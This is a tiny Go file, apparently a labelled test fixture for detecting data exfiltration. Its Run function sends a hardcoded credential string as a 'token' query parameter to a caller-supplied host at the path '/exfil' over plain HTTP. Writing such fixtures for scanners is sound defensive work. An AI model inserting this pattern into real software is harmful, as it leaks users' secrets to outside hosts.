// Phase 11 (Track J.9) — Go DATA_EXFIL vuln fixture.
package vuln

import (
    "net/http"
    "net/url"
)

func Run(host string) {
    secret := "alice-creds"
    q := url.Values{"token": {secret}}
    u := url.URL{Scheme: "http", Host: host, Path: "/exfil", RawQuery: q.Encode()}
    _, _ = http.Get(u.String())
}
